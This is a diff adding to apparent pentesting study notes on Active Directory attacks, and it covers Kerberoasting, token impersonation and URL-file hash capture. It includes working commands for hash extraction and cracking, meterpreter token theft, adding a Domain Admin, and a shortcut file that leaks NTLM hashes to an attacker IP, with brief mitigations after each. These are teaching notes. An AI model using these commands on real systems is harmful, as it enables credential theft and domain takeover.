@@ -140,4 +140,76 @@ Privilege Access Management (PAM):
 - Automatically rotate passwords on check out and check in
 - Limits pass attacks as hash/password is strong and constantly rotated
 
+### Kerberoasting Overview
 
+![Kerberoasting](./pictures/kerberoasting.png)
+
+1. Get SPNs, dump hash
+`python GetUserSPNs.py DOMAIN/username:password -dc-ip 10.0.0.1 -request`
+
+2. Crack the hash
+`hashcat -m 13100 kerberoast.txt rockyou.txt`
+
+### Kerberoasting Mitigation
+
+Mitigation Strategies:
+
+- Strong passwords
+- Least privilege
+
+### Token Impersonation Overview
+
+**Token Impersonation**
+
+What are tokens?
+
+- Temporary keys that allow you access to a system/network without having to provide credentials each time 
+you access a file. Think of cookies
+
+Two Types:
+
+- Delegate - Created for logging into a machine or using Remote Desktop
+- Impersonate - "non-interactive" such as attaching a network drive or a domain logon script
+
+### Token Impersonation Walkthrough
+
+Start msfconsole and load psexec with an x64 meterpreter payload then run the exploit
+
+Use `load` to load incognito in the meterpreter shell and check available commands with `help`
+
+`load incognito`
+
+Use `list_tokens` to show available tokens, with -g for groups and -u for users
+Use `impersonate_token domain\\user` to impersonate a user and `rev2self` to drop the impersonation
+
+If we find a domain admin token available for impersonation we can use that to add a user to the Domain Admin
+group
+
+`net user /add username password /domain` 
+`net group "Domain Admins" username /ADD /DOMAIN`
+
+### Token Impersonation Mitigation
+
+Mitigation Strategies:
+
+- Limit user/group token creation permission
+- Account tiering
+- Local admin restriction
+
+### URL File Attacks
+
+Create a malicious Shortcut file, replacing `10.10.10.10` with the attacker IP. Save the file as 
+"@filename.url" or "~filename.url" and place it in a network share.
+
+Run responder with HTTP and SMB turned on in Responder.conf, then wait until someone navigates to the share 
+and the hashes should be dumped to responder
+
+```
+[InternetShortcut]
+URL=whatever
+WorkingDirectory=whatever
+IconFile=\\10.10.10.10\%USERNAME%.icon
+IconIndex=1
+```
+
+### GPP/cPassword Attacks and Mitigations
